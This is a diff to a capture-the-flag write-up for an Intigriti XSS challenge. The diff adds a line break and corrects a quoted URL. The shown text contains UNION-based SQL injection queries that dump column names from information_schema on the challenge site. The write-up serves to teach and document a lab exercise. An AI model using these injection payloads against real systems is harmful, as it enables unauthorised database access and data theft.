@@ -29,6 +29,8 @@ categories: ctfwriteup
 
 <img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/fails.png">
 
+<br>
+
 <img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/loads.png">
 
 <p>• But what we do with sql injection in an xss challenge? ok lets check wether we can dump the database.</p>
@@ -65,7 +67,7 @@ Query used : https://challenge-0722.intigriti.io/challenge/challenge.php?month=1
 
 ```
 Queries Used:
-'https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x75736572-- -
+https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x75736572-- -
 
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x706f7374-- -
 
